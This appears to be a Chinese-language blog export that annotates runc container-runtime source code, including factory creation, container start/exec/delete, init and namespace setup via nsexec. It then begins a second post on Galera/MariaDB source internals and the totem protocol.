loadFactory(context)函数： 1234567891011121314151617// loadFactory returns the configured factory instance for execing containers.func loadFactory(context *cli.Context) (libcontainer.Factory, error) &#123; root := context.GlobalString(\"root\") abs, err := filepath.Abs(root) if err != nil &#123; return nil, err &#125; cgroupManager := libcontainer.Cgroupfs // 获取cgroupfs对象 if context.GlobalBool(\"systemd-cgroup\") &#123; if systemd.UseSystemd() &#123; cgroupManager = libcontainer.SystemdCgroups &#125; else &#123; return nil, fmt.Errorf(\"systemd cgroup flag passed, but systemd support for managing cgroups is not available\") &#125; &#125; return libcontainer.New(abs, cgroupManager, libcontainer.CriuPath(context.GlobalString(\"criu\")))&#125; New函数： 123456789101112131415161718192021222324// New returns a linux based container factory based in the root directory and// configures the factory with the provided option funcs.func New(root string, options ...func(*LinuxFactory) error) (Factory, error) &#123; if root != \"\" &#123; //设置权限 if err := os.MkdirAll(root, 0700); err != nil &#123; return nil, newGenericError(err, SystemError) &#125; &#125; //返回一个自身进程 l := &amp;LinuxFactory&#123; Root: root, InitArgs: []string&#123;\"/proc/self/exe\", \"init\"&#125;, Validator: validate.New(), CriuPath: \"criu\", &#125; Cgroupfs(l) for _, opt := range options &#123; if err := opt(l); err != nil &#123; return nil, err &#125; &#125; return l, nil&#125; Cgroupfs函数： 12345678910111213// Cgroupfs is an options func to configure a LinuxFactory to return// containers that use the native cgroups filesystem implementation to// create and manage cgroups.func Cgroupfs(l *LinuxFactory) error &#123; //返回一个cgroups对象 l.NewCgroupsManager = func(config *configs.Cgroup, paths map[string]string) cgroups.Manager &#123; return &amp;fs.Manager&#123; Cgroups: config, Paths: paths, &#125; &#125; return nil&#125; create函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) &#123; // root为空返回 if l.Root == \"\" &#123; return nil, newGenericError(fmt.Errorf(\"invalid root\"), ConfigInvalid) &#125; // 验证id if err := l.validateID(id); err != nil &#123; return nil, err &#125; //验证是否路径正常 if err := l.Validator.Validate(config); err != nil &#123; return nil, newGenericError(err, ConfigInvalid) &#125; //获取host uid uid, err := config.HostUID() if err != nil &#123; return nil, newGenericError(err, SystemError) &#125; // 获取gid gid, err := config.HostGID() if err != nil &#123; return nil, newGenericError(err, SystemError) &#125; //容器的路径 containerRoot := filepath.Join(l.Root, id) //如果已经在使用，报错 if _, err := os.Stat(containerRoot); err == nil &#123; return nil, newGenericError(fmt.Errorf(\"container with id exists: %v\", id), IdInUse) &#125; else if !os.IsNotExist(err) &#123; return nil, newGenericError(err, SystemError) &#125; //设置权限 if err := os.MkdirAll(containerRoot, 0711); err != nil &#123; return nil, newGenericError(err, SystemError) &#125; //赋权 if err := os.Chown(containerRoot, uid, gid); err != nil &#123; return nil, newGenericError(err, SystemError) &#125; //fifo路径 fifoName := filepath.Join(containerRoot, execFifoFilename) oldMask := syscall.Umask(0000) if err := syscall.Mkfifo(fifoName, 0622); err != nil &#123; syscall.Umask(oldMask) return nil, newGenericError(err, SystemError) &#125; //umask syscall.Umask(oldMask) if err := os.Chown(fifoName, uid, gid); err != nil &#123; return nil, newGenericError(err, SystemError) &#125; //返回容器对象 c := &amp;linuxContainer&#123; id: id, root: containerRoot, config: config, initArgs: l.InitArgs, criuPath: l.CriuPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), &#125; c.state = &amp;stoppedState&#123;c: c&#125; return c, nil&#125; run函数执行启动： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657func (r *runner) run(config *specs.Process) (int, error) &#123; process, err := newProcess(*config) //创建新的process,返回一个新的libcontainer process if err != nil &#123; r.destroy() return -1, err &#125; if len(r.listenFDs) &gt; 0 &#123; process.Env = append(process.Env, fmt.Sprintf(\"LISTEN_FDS=%d\", len(r.listenFDs)), \"LISTEN_PID=1\") process.ExtraFiles = append(process.ExtraFiles, r.listenFDs...) &#125; rootuid, err := r.container.Config().HostUID() //获取host uid if err != nil &#123; r.destroy() return -1, err &#125; rootgid, err := r.container.Config().HostGID() //获取host gid if err != nil &#123; r.destroy() return -1, err &#125; tty, err := setupIO(process, rootuid, rootgid, r.console, config.Terminal, r.detach || r.create) // 设置io if err != nil &#123; r.destroy() return -1, err &#125; handler := newSignalHandler(tty, r.enableSubreaper) // 信号处理函数 startFn := r.container.Start //启动函数 if !r.create &#123; startFn = r.container.Run &#125; defer tty.Close() if err := startFn(process); err != nil &#123; //启动进程 r.destroy() return -1, err &#125; if err := tty.ClosePostStart(); err != nil &#123; r.terminate(process) r.destroy() return -1, err &#125; if r.pidFile != \"\" &#123; //创建pid文件 if err := createPidFile(r.pidFile, process); err != nil &#123; r.terminate(process) r.destroy() return -1, err &#125; &#125; if r.detach || r.create &#123; return 0, nil &#125; status, err := handler.forward(process) //等待信息 if err != nil &#123; r.terminate(process) &#125; r.destroy() return status, err&#125; 这边启动函数为： 123456789func (c *linuxContainer) Start(process *Process) error &#123; c.m.Lock() defer c.m.Unlock() status, err := c.currentStatus() //获取当前状态 if err != nil &#123; return err &#125; return c.start(process, status == Stopped)&#125; start函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748func (c *linuxContainer) start(process *Process, isInit bool) error &#123; parent, err := c.newParentProcess(process, isInit) //创建newParentProcess进程， if err != nil &#123; return newSystemErrorWithCause(err, \"creating new parent process\") &#125; if err := parent.start(); err != nil &#123; //start // terminate the process to ensure that it properly is reaped. if err := parent.terminate(); err != nil &#123; logrus.Warn(err) &#125; return newSystemErrorWithCause(err, \"starting container process\") &#125; // generate a timestamp indicating when the container was started c.created = time.Now().UTC() c.state = &amp;runningState&#123; c: c, &#125; if isInit &#123; c.state = &amp;createdState&#123; c: c, &#125; state, err := c.updateState(parent) if err != nil &#123; return err &#125; c.initProcessStartTime = state.InitProcessStartTime if c.config.Hooks != nil &#123; s := configs.HookState&#123; Version: c.config.Version, ID: c.id, Pid: parent.pid(), Root: c.config.Rootfs, BundlePath: utils.SearchLabels(c.config.Labels, \"bundle\"), &#125; //启动hook函数 for i, hook := range c.config.Hooks.Poststart &#123; if err := hook.Run(s); err != nil &#123; if err := parent.terminate(); err != nil &#123; logrus.Warn(err) &#125; return newSystemErrorWithCausef(err, \"running poststart hook %d\", i) &#125; &#125; &#125; &#125; return nil&#125; newParentProcess函数： 1234567891011121314151617181920func (c *linuxContainer) newParentProcess(p *Process, doInit bool) (parentProcess, error) &#123; parentPipe, childPipe, err := newPipe()//新建管道 if err != nil &#123; return nil, newSystemErrorWithCause(err, \"creating new init pipe\") &#125; rootDir, err := os.Open(c.root) //打开rootdir路径 if err != nil &#123; return nil, err &#125; cmd, err := c.commandTemplate(p, childPipe, rootDir)//返回template模版 if err != nil &#123; return nil, newSystemErrorWithCause(err, \"creating new command template\") &#125; if !doInit &#123; //new set namespace process return c.newSetnsProcess(p, cmd, parentPipe, childPipe, rootDir) &#125; //new init process return c.newInitProcess(p, cmd, parentPipe, childPipe, rootDir)&#125; newSetnsProcess函数： 12345678910111213141516171819202122232425func (c *linuxContainer) newSetnsProcess(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File) (*setnsProcess, error) &#123; cmd.Env = append(cmd.Env, \"_LIBCONTAINER_INITTYPE=\"+string(initSetns)) state, err := c.currentState()//获取当前状态 if err != nil &#123; return nil, newSystemErrorWithCause(err, \"getting container's current state\") &#125; // for setns process, we dont have to set cloneflags as the process namespaces // will only be set via setns syscall // bootstrapData data, err := c.bootstrapData(0, state.NamespacePaths, p.consolePath) if err != nil &#123; return nil, err &#125; // TODO: set on container for process management return &amp;setnsProcess&#123; cmd: cmd, cgroupPaths: c.cgroupManager.GetPaths(), childPipe: childPipe, parentPipe: parentPipe, config: c.newInitConfig(p), process: p, bootstrapData: data, rootDir: rootDir, &#125;, nil&#125; newInitProcess函数： 1234567891011121314151617181920212223242526func (c *linuxContainer) newInitProcess(p *Process, cmd *exec.Cmd, parentPipe, childPipe, rootDir *os.File) (*initProcess, error) &#123; cmd.Env = append(cmd.Env, \"_LIBCONTAINER_INITTYPE=\"+string(initStandard)) nsMaps := make(map[configs.NamespaceType]string) for _, ns := range c.config.Namespaces &#123; if ns.Path != \"\" &#123; nsMaps[ns.Type] = ns.Path //namespace映射关系 &#125; &#125; _, sharePidns := nsMaps[configs.NEWPID] data, err := c.bootstrapData(c.config.Namespaces.CloneFlags(), nsMaps, \"\") if err != nil &#123; return nil, err &#125; return &amp;initProcess&#123; cmd: cmd, childPipe: childPipe, parentPipe: parentPipe, manager: c.cgroupManager, config: c.newInitConfig(p), container: c, process: p, bootstrapData: data, sharePidns: sharePidns, rootDir: rootDir, &#125;, nil&#125; Start命令过程： 1234567891011121314151617181920Action: func(context *cli.Context) error &#123; container, err := getContainer(context) // if err != nil &#123; return err &#125; status, err := container.Status() //获取容器状态 if err != nil &#123; return err &#125; switch status &#123; case libcontainer.Created: //状态时已经创建，则执行启动 return container.Exec() case libcontainer.Stopped: // 已经停止，这个停止时进程已经没有了。docker stop是pause状态。 return fmt.Errorf(\"cannot start a container that has run and stopped\") case libcontainer.Running: // 已经启动 return fmt.Errorf(\"cannot start an already running container\") default: return fmt.Errorf(\"cannot start a container in the %s state\", status) &#125; &#125;, getContainer函数，获取容器实例对象 12345678910111213// getContainer returns the specified container instance by loading it from state// with the default factory.func getContainer(context *cli.Context) (libcontainer.Container, error) &#123; id := context.Args().First() if id == \"\" &#123; return nil, errEmptyID &#125; factory, err := loadFactory(context) if err != nil &#123; return nil, err &#125; return factory.Load(id)&#125; exec执行： 1234567891011121314151617181920212223242526func (c *linuxContainer) Exec() error &#123; c.m.Lock() defer c.m.Unlock() return c.exec() //调用exec函数&#125;func (c *linuxContainer) exec() error &#123; //打开path路径 path := filepath.Join(c.root, execFifoFilename) //打开fifo文件 f, err := os.OpenFile(path, os.O_RDONLY, 0) if err != nil &#123; return newSystemErrorWithCause(err, \"open exec fifo for reading\") &#125; defer f.Close() //读取文件数据 data, err := ioutil.ReadAll(f) if err != nil &#123; return err &#125; if len(data) &gt; 0 &#123; os.Remove(path) return nil &#125; return fmt.Errorf(\"cannot start an already running container\")&#125; Run命令启动： 12345678910111213Action: func(context *cli.Context) error &#123; spec, err := setupSpec(context) if err != nil &#123; return err &#125; status, err := startContainer(context, spec, false) if err == nil &#123; // exit with the container's exit status so any external supervisor is // notified of the exit with the correct exit status. os.Exit(status) &#125; return err &#125;, 调用setupSpec函数： 123456789101112131415161718192021// setupSpec performs inital setup based on the cli.Context for the containerfunc setupSpec(context *cli.Context) (*specs.Spec, error) &#123; bundle := context.String(\"bundle\") if bundle != \"\" &#123; if err := os.Chdir(bundle); err != nil &#123; return nil, err &#125; &#125; spec, err := loadSpec(specConfig) //加载spec文件 if err != nil &#123; return nil, err &#125; notifySocket := os.Getenv(\"NOTIFY_SOCKET\") if notifySocket != \"\" &#123; setupSdNotify(spec, notifySocket) &#125; if os.Geteuid() != 0 &#123; return nil, fmt.Errorf(\"runc should be run as root\") &#125; return spec, nil&#125; startContainer函数执行过程和create类似。 delete命令： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Action: func(context *cli.Context) error &#123; if !context.Args().Present() &#123; return fmt.Errorf(\"runc: \\\"delete\\\" requires a minimum of 1 argument\") &#125; factory, err := loadFactory(context) //加载 if err != nil &#123; return err &#125; for _, id := range context.Args() &#123; container, err := factory.Load(id) //加载指定的id的容器 if err != nil &#123; if lerr, ok := err.(libcontainer.Error); ok &amp;&amp; lerr.Code() == libcontainer.ContainerNotExists &#123; // if there was an aborted start or something of the sort then the container's directory could exist but // libcontainer does not see it because the state.json file inside that directory was never created. path := filepath.Join(context.GlobalString(\"root\"), id) if err := os.RemoveAll(path); err != nil &#123; fmt.Fprintf(os.Stderr, \"remove %s: %v\\n\", path, err) &#125; fmt.Fprintf(os.Stderr, \"container %s is not exist\\n\", id) &#125; continue &#125; s, err := container.Status() //获取容器状态 if err != nil &#123; fmt.Fprintf(os.Stderr, \"status for %s: %v\\n\", id, err) continue &#125; switch s &#123; case libcontainer.Stopped: //已经停止，就销毁 destroy(container) case libcontainer.Created: //创建，删掉 err := killContainer(container) if err != nil &#123; fmt.Fprintf(os.Stderr, \"kill container %s: %v\\n\", id, err) &#125; default: if context.Bool(\"force\") &#123; err := killContainer(container) if err != nil &#123; fmt.Fprintf(os.Stderr, \"kill container %s: %v\\n\", id, err) &#125; &#125; else &#123; fmt.Fprintf(os.Stderr, \"cannot delete container %s that is not stopped: %s\\n\", id, s) &#125; &#125; &#125; return nil &#125;, killcontainer函数，发送信号，销毁进程。 1234567891011func killContainer(container libcontainer.Container) error &#123; container.Signal(syscall.SIGKILL) for i := 0; i &lt; 100; i++ &#123; time.Sleep(100 * time.Millisecond) if err := container.Signal(syscall.Signal(0)); err != nil &#123; //如果发送信息失败，强制销毁 destroy(container) return nil &#125; &#125; return fmt.Errorf(\"container init still running\")&#125; destroy函数： 1234567891011121314151617func destroy(c *linuxContainer) error &#123; if !c.config.Namespaces.Contains(configs.NEWPID) &#123; //配置pid if err := killCgroupProcesses(c.cgroupManager); err != nil &#123; logrus.Warn(err) //杀死cgroup进程 &#125; &#125; err := c.cgroupManager.Destroy() //销毁cgroupManager if rerr := os.RemoveAll(c.root); err == nil &#123; //删除路径信息 err = rerr &#125; c.initProcess = nil if herr := runPoststopHooks(c); err == nil &#123; //runPostStopHook err = herr &#125; c.state = &amp;stoppedState&#123;c: c&#125; return err&#125; initCommand命令调用初始化函数: 1234567891011121314var initCommand = cli.Command&#123; Name: \"init\", Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`, Action: func(context *cli.Context) error &#123; factory, _ := libcontainer.New(\"\") if err := factory.StartInitialization(); err != nil &#123; // as the error is sent back to the parent there is no need to log // or write it to stderr because the parent process will handle this os.Exit(1) &#125; panic(\"libcontainer: container init failed to exec\") &#125;,&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// StartInitialization loads a container by opening the pipe fd from the parent to read the configuration and state// This is a low level implementation detail of the reexec and should not be consumed externallyfunc (l *LinuxFactory) StartInitialization() (err error) &#123; var pipefd, rootfd int for _, pair := range []struct &#123; k string v *int &#125;&#123; &#123;\"_LIBCONTAINER_INITPIPE\", &amp;pipefd&#125;, &#123;\"_LIBCONTAINER_STATEDIR\", &amp;rootfd&#125;, &#125; &#123; s := os.Getenv(pair.k) i, err := strconv.Atoi(s) if err != nil &#123; return fmt.Errorf(\"unable to convert %s=%s to int\", pair.k, s) &#125; *pair.v = i &#125; var ( pipe = os.NewFile(uintptr(pipefd), \"pipe\") it = initType(os.Getenv(\"_LIBCONTAINER_INITTYPE\")) ) // clear the current process's environment to clean any libcontainer // specific env vars. os.Clearenv() var i initer defer func() &#123; // We have an error during the initialization of the container's init, // send it back to the parent process in the form of an initError. // If container's init successed, syscall.Exec will not return, hence // this defer function will never be called. if _, ok := i.(*linuxStandardInit); ok &#123; // Synchronisation only necessary for standard init. if werr := utils.WriteJSON(pipe, syncT&#123;procError&#125;); werr != nil &#123; panic(err) &#125; &#125; if werr := utils.WriteJSON(pipe, newSystemError(err)); werr != nil &#123; panic(err) &#125; // ensure that this pipe is always closed pipe.Close() &#125;() defer func() &#123; if e := recover(); e != nil &#123; err = fmt.Errorf(\"panic from initialization: %v, %v\", e, string(debug.Stack())) &#125; &#125;() i, err = newContainerInit(it, pipe, rootfd) if err != nil &#123; return err &#125; return i.Init()&#125; newContainerInit函数： 1234567891011121314151617181920212223func newContainerInit(t initType, pipe *os.File, stateDirFD int) (initer, error) &#123; var config *initConfig if err := json.NewDecoder(pipe).Decode(&amp;config); err != nil &#123; return nil, err &#125; if err := populateProcessEnvironment(config.Env); err != nil &#123; return nil, err &#125; switch t &#123; case initSetns: return &amp;linuxSetnsInit&#123; config: config, &#125;, nil case initStandard: return &amp;linuxStandardInit&#123; pipe: pipe, parentPid: syscall.Getppid(), config: config, stateDirFD: stateDirFD, &#125;, nil &#125; return nil, fmt.Errorf(\"unknown init type %q\", t)&#125; populateProcessEnvironment函数： 123456789101112131415// populateProcessEnvironment loads the provided environment variables into the// current processes's environment.func populateProcessEnvironment(env []string) error &#123; for _, pair := range env &#123; p := strings.SplitN(pair, \"=\", 2) if len(p) &lt; 2 &#123; return fmt.Errorf(\"invalid environment '%v'\", pair) &#125; //设置环境变量 if err := os.Setenv(p[0], p[1]); err != nil &#123; return err &#125; &#125; return nil&#125; 初始化函数init: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137func (l *linuxStandardInit) Init() error &#123; if !l.config.Config.NoNewKeyring &#123; ringname, keepperms, newperms := l.getSessionRingParams() // do not inherit the parent's session keyring sessKeyId, err := keys.JoinSessionKeyring(ringname) if err != nil &#123; return err &#125; // make session keyring searcheable if err := keys.ModKeyringPerm(sessKeyId, keepperms, newperms); err != nil &#123; return err &#125; &#125; var console *linuxConsole if l.config.Console != \"\" &#123; console = newConsoleFromPath(l.config.Console) if err := console.dupStdio(); err != nil &#123; return err &#125; &#125; if console != nil &#123; if err := system.Setctty(); err != nil &#123; return err &#125; &#125; if err := setupNetwork(l.config); err != nil &#123; //初始化网络 return err &#125; if err := setupRoute(l.config.Config); err != nil &#123; //初始化route return err &#125; label.Init() // InitializeMountNamespace() can be executed only for a new mount namespace if l.config.Config.Namespaces.Contains(configs.NEWNS) &#123; if err := setupRootfs(l.config.Config, console, l.pipe); err != nil &#123; return err &#125; &#125; //设置hostname if hostname := l.config.Config.Hostname; hostname != \"\" &#123; if err := syscall.Sethostname([]byte(hostname)); err != nil &#123; return err &#125; &#125; if err := apparmor.ApplyProfile(l.config.AppArmorProfile); err != nil &#123; return err &#125; if err := label.SetProcessLabel(l.config.ProcessLabel); err != nil &#123; return err &#125; for key, value := range l.config.Config.Sysctl &#123; if err := writeSystemProperty(key, value); err != nil &#123; return err &#125; &#125; //remount只读 for _, path := range l.config.Config.ReadonlyPaths &#123; if err := remountReadonly(path); err != nil &#123; return err &#125; &#125; //mask路径 for _, path := range l.config.Config.MaskPaths &#123; if err := maskPath(path); err != nil &#123; return err &#125; &#125; // 获取parent信号 pdeath, err := system.GetParentDeathSignal() if err != nil &#123; return err &#125; if l.config.NoNewPrivileges &#123; if err := system.Prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); err != nil &#123; return err &#125; &#125; // Tell our parent that we're ready to Execv. This must be done before the // Seccomp rules have been applied, because we need to be able to read and // write to a socket. if err := syncParentReady(l.pipe); err != nil &#123; return err &#125; // Without NoNewPrivileges seccomp is a privileged operation, so we need to // do this before dropping capabilities; otherwise do it as late as possible // just before execve so as few syscalls take place after it as possible. if l.config.Config.Seccomp != nil &amp;&amp; !l.config.NoNewPrivileges &#123; if err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil &#123; return err &#125; &#125; if err := finalizeNamespace(l.config); err != nil &#123; return err &#125; // finalizeNamespace can change user/group which clears the parent death // signal, so we restore it here. if err := pdeath.Restore(); err != nil &#123; return err &#125; // compare the parent from the inital start of the init process and make sure that it did not change. // if the parent changes that means it died and we were reparented to something else so we should // just kill ourself and not cause problems for someone else. if syscall.Getppid() != l.parentPid &#123; return syscall.Kill(syscall.Getpid(), syscall.SIGKILL) &#125; // check for the arg before waiting to make sure it exists and it is returned // as a create time error. name, err := exec.LookPath(l.config.Args[0]) if err != nil &#123; return err &#125; // close the pipe to signal that we have completed our init. l.pipe.Close() // wait for the fifo to be opened on the other side before // exec'ing the users process. fd, err := syscall.Openat(l.stateDirFD, execFifoFilename, os.O_WRONLY|syscall.O_CLOEXEC, 0) if err != nil &#123; return newSystemErrorWithCause(err, \"openat exec fifo\") &#125; if _, err := syscall.Write(fd, []byte(\"0\")); err != nil &#123; return newSystemErrorWithCause(err, \"write 0 exec fifo\") &#125; if l.config.Config.Seccomp != nil &amp;&amp; l.config.NoNewPrivileges &#123; if err := seccomp.InitSeccomp(l.config.Config.Seccomp); err != nil &#123; return newSystemErrorWithCause(err, \"init seccomp\") &#125; &#125; //系统调用 if err := syscall.Exec(name, l.config.Args[0:], os.Environ()); err != nil &#123; return newSystemErrorWithCause(err, \"exec user process\") &#125; return nil&#125; 设置rootfs文件路径setupRootfs函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980setupRootfs// setupRootfs sets up the devices, mount points, and filesystems for use inside a// new mount namespace.func setupRootfs(config *configs.Config, console *linuxConsole, pipe io.ReadWriter) (err error) &#123; if err := prepareRoot(config); err != nil &#123; //准备prepareRoot return newSystemErrorWithCause(err, \"preparing rootfs\") &#125; setupDev := needsSetupDev(config) for _, m := range config.Mounts &#123; for _, precmd := range m.PremountCmds &#123; if err := mountCmd(precmd); err != nil &#123; return newSystemErrorWithCause(err, \"running premount command\") &#125; &#125; //mountTorootfs,挂载到rootfs if err := mountToRootfs(m, config.Rootfs, config.MountLabel); err != nil &#123; return newSystemErrorWithCausef(err, \"mounting %q to rootfs %q at %q\", m.Source, config.Rootfs, m.Destination) &#125; //mountcmd for _, postcmd := range m.PostmountCmds &#123; if err := mountCmd(postcmd); err != nil &#123; return newSystemErrorWithCause(err, \"running postmount command\") &#125; &#125; &#125; if setupDev &#123; if err := createDevices(config); err != nil &#123; return newSystemErrorWithCause(err, \"creating device nodes\") &#125; if err := setupPtmx(config, console); err != nil &#123; return newSystemErrorWithCause(err, \"setting up ptmx\") &#125; if err := setupDevSymlinks(config.Rootfs); err != nil &#123; return newSystemErrorWithCause(err, \"setting up /dev symlinks\") &#125; &#125; // Signal the parent to run the pre-start hooks. // The hooks are run after the mounts are setup, but before we switch to the new // root, so that the old root is still available in the hooks for any mount // manipulations. if err := syncParentHooks(pipe); err != nil &#123; return err &#125; if err := syscall.Chdir(config.Rootfs); err != nil &#123; return newSystemErrorWithCausef(err, \"changing dir to %q\", config.Rootfs) &#125; if config.NoPivotRoot &#123; err = msMoveRoot(config.Rootfs) &#125; else &#123; err = pivotRoot(config.Rootfs, config.PivotDir) &#125; if err != nil &#123; return newSystemErrorWithCause(err, \"jailing process inside rootfs\") &#125; if setupDev &#123; if err := reOpenDevNull(); err != nil &#123; return newSystemErrorWithCause(err, \"reopening /dev/null inside container\") &#125; &#125; // remount dev as ro if specifed for _, m := range config.Mounts &#123; if libcontainerUtils.CleanPath(m.Destination) == \"/dev\" &#123; if m.Flags&amp;syscall.MS_RDONLY != 0 &#123; if err := remountReadonly(m.Destination); err != nil &#123; return newSystemErrorWithCausef(err, \"remounting %q as readonly\", m.Destination) &#125; &#125; break &#125; &#125; // set rootfs ( / ) as readonly if config.Readonlyfs &#123; if err := setReadonly(); err != nil &#123; return newSystemErrorWithCause(err, \"setting rootfs as readonly\") &#125; &#125; syscall.Umask(0022) return nil&#125; init nsenter包导入： 在runc init命令的响应在文件 init.go 开头，导入 nsenter 包 123456789/* init.go */import ( \"os\" \"runtime\" \"github.com/opencontainers/runc/libcontainer\" _ \"github.com/opencontainers/runc/libcontainer/nsenter\" \"github.com/urfave/cli\") 而nsenter包中开头通过 cgo 嵌入了一段 C 代码, 调用 nsexec() 12345678910package nsenter/*/* nsenter.go */#cgo CFLAGS: -Wallextern void nsexec();void __attribute__((constructor)) init(void) &#123; nsexec();&#125;*/import \"C\" 接下来，轮到 nsexec() 完成为容器创建新的 namespace 的工作了, nsexec() 同样很长，逐段来看 1234567891011121314151617181920/* libcontainer/nsenter/nsexec.c */void nsexec(void)&#123; int pipenum; jmp_buf env; int sync_child_pipe[2], sync_grandchild_pipe[2]; struct nlconfig_t config = &#123; 0 &#125;; /* * If we don't have an init pipe, just return to the go routine. * We'll only get an init pipe for start or exec. */ pipenum = initpipe(); if (pipenum == -1) return; /* Parse all of the netlink configuration. */ nl_parse(pipenum, &amp;config); ...... initpipe() 从环境中读取父进程之前设置的pipe(_LIBCONTAINER_INITPIPE记录的的文件描述符)，然后调用 nl_parse 从这个管道中读取配置到变量 config ，那么谁会往这个管道写配置呢 ? 当然就是runc create父进程了。父进程通过这个pipe，将新建容器的配置发给子进程，这个过程如下图所示: 子进程就从父进程处得到了namespace的配置，继续往下， nsexec() 又创建了两个socketpair,从注释中了解到，这是为了和它自己的子进程和孙进程进行通信。 123456789101112131415void nsexec(void)&#123; ..... /* Pipe so we can tell the child when we've finished setting up. */ if (socketpair(AF_LOCAL, SOCK_STREAM, 0, sync_child_pipe) &lt; 0) // sync_child_pipe is an out parameter bail(\"failed to setup sync pipe between parent and child\"); /* * We need a new socketpair to sync with grandchild so we don't have * race condition with child. */ if (socketpair(AF_LOCAL, SOCK_STREAM, 0, sync_grandchild_pipe) &lt; 0) bail(\"failed to setup sync pipe between parent and grandchild\"); &#125; switch case 编写的状态机,大体结构如下，当前进程通过clone()系统调用创建子进程，子进程又通过clone()系统调用创建孙进程，而实际的创建/加入namespace是在子进程完成的 123456789101112131415switch (setjmp(env)) &#123; case JUMP_PARENT:&#123; ..... clone_parent(&amp;env, JUMP_CHILD); ..... &#125; case JUMP_CHILD:&#123; ...... if (config.namespaces) join_namespaces(config.namespaces); clone_parent(&amp;env, JUMP_INIT); ...... &#125; case JUMP_INIT:&#123; &#125; 状态机流程： namespaces在runc init 2完成创建 runc init 1和runc init 2最终都会执行exit(0),但runc init 3不会，它会继续执行runc init命令的后半部分。因此最终只会剩下runc create进程和runc init 3进程 回到代码中： 12345678func (p *initProcess) start() error &#123; p.cmd.Start() p.process.ops = p io.Copy(p.parentPipe, p.bootstrapData); p.execSetns() ...... 再向 runc init发送了 bootstrapData 数据后，便调用 execSetns() 等待runc init 1进程终止，从管道中得到runc init 3的进程 pid,将该进程保存在 p.process.ops 12345678910111213/* libcontainer/process_linux.go */func (p *initProcess) execSetns() error &#123; status, err := p.cmd.Process.Wait() var pid *pid json.NewDecoder(p.parentPipe).Decode(&amp;pid) process, err := os.FindProcess(pid.Pid) p.cmd.Process = process p.process.ops = p return nil&#125; 3. 参考资料https://segmentfault.com/a/1190000017576314?utm_source=tag-newest","categories":[{"name":"docker","slug":"docker","permalink":"http://www.yorzorzy.xyz/categories/docker/"}],"tags":[{"name":"runc","slug":"runc","permalink":"http://www.yorzorzy.xyz/tags/runc/"}]},{"title":"galera原理和源码学习","slug":"galera原理","date":"2020-03-27T03:34:48.239Z","updated":"2020-03-27T03:34:48.239Z","comments":true,"path":"2020/03/27/galera原理/","link":"","permalink":"http://www.yorzorzy.xyz/2020/03/27/galera%E5%8E%9F%E7%90%86/","excerpt":"","text":"galera原理和源码学习源码架构分析数据库版本： mariadb 10.1.12 + galera 25.3.14 源码执行流程 一致性协议说起totem协议，最简单的形象就是，他将多个节点组成一个令牌环。多个节点手拉手形成一个圈，大家依次的传递token。只有获取到token的节点才有发送消息的权利。简单有效的解决了在分布式系统中各个节点的同步问题，因为只有一个节点会在一个时刻发送消息，不会出现冲突。当然，如果有节点发生意外时，令牌环就会断掉，此时大家不能够通信，而是重新组建出一个新的令牌环。 galera代码入口wsrep是mariadb提供对外的接口，通过虚函数插件的方式加载so库动态链接库的方式来加载外部函数。mariadb可以通过galera的动态链接库来调用galera中实现的函数。galera使用的一致性协议是totem协议。这个协议强一致性，但是存在分区问题。所以galera本身遇到写入冲突的时候，会将节点排出集群之外，类似于“脑裂”的问题。galera只支持innodb数据库。 wsrep入口在初始化mariadb数据库初始化的时候， 123456789101112int mysqld_main(int argc, char **argv) // 数据库入口函数 ... /* The subsequent calls may take a long time : e.g. innodb log read. Thus set the long running service control manager timeout */#if defined(_WIN32) &amp;&amp; !defined(EMBEDDED_LIBRARY) Service.SetSlowStarting(slow_start_timeout);#endif if (init_server_components()) //初始化入口 unireg_abort(1); init_server_components函数初始化： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508static int init_server_components()&#123; DBUG_ENTER(\"init_server_components\"); /* We need to call each of these following functions to ensure that all things are initialized so that unireg_abort() doesn't fail */ mdl_init(); //初始化元数据锁 tdc_init(); //Initialize table definition cache. if (hostname_cache_init()) unireg_abort(1); query_cache_set_min_res_unit(query_cache_min_res_unit); query_cache_result_size_limit(query_cache_limit); /* if we set size of QC non zero in config then probably we want it ON */ if (query_cache_size != 0 &amp;&amp; global_system_variables.query_cache_type == 0 &amp;&amp; !IS_SYSVAR_AUTOSIZE(&amp;query_cache_size)) &#123; global_system_variables.query_cache_type= 1; &#125; query_cache_init(); // query cache init query_cache_resize(query_cache_size); //重新resize my_rnd_init(&amp;sql_rand,(ulong) server_start_time,(ulong) server_start_time/2); //随机数初始化 setup_fpu(); init_thr_lock(); //初始化线程锁#ifndef EMBEDDED_LIBRARY if (init_thr_timer(thread_scheduler-&gt;max_threads + extra_max_connections)) &#123; fprintf(stderr, \"Can't initialize timers\\n\"); unireg_abort(1); &#125;#endif 